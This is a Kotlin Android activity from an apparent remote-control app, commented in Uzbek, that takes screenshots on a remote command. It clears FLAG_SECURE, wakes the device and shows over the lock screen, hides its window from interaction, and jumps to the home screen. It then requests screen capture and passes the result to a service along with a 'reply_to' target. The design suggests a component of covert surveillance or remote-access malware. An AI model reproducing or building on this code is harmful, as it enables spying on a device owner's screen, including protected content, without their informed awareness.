package com.example.remotecontrol

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.WindowManager

class ScreenshotActivity : Activity() {

    private lateinit var replyTo: String
    private val REQUEST_CODE = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // FLAG_SECURE ni olib tashlash
        window.clearFlags(WindowManager.LayoutParams.FLAG_SECURE)
        window.addFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )

        replyTo = intent.getStringExtra("reply_to") ?: ""

        // Home ekraniga qaytib, keyin screenshot olish
        val homeIntent = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_HOME)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(homeIntent)

        // 1 soniya kutib, ruxsat so'rash
        Handler(Looper.getMainLooper()).postDelayed({
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_CODE)
        }, 1000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE) {
            val serviceIntent = Intent(this, ScreenshotService::class.java).apply {
                putExtra("reply_to", replyTo)
                putExtra("result_code", resultCode)
                putExtra("data", data)
            }
            startForegroundService(serviceIntent)
        }
        finish()
    }
}
